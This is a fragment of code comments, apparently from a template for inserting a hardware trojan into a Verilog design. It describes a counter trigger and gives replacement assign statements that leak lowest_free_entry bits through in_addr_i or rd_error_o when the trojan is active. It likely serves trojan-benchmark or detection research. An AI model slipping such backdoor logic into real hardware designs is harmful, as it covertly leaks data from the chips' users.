 ...
 *   
 * Trigger: Counter on lowest_free_entry
 * Payload: Route in_addr_i[0] to observable output
 * 
...
//   Find the assign for in_addr_i (or rd_error_o as fallback):
//     assign in_addr_i = <normal_expr>;
//   Replace with:
//     assign in_addr_i = trojan_active ? lowest_free_entry[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? lowest_free_entry[0] : 1'b0;
//
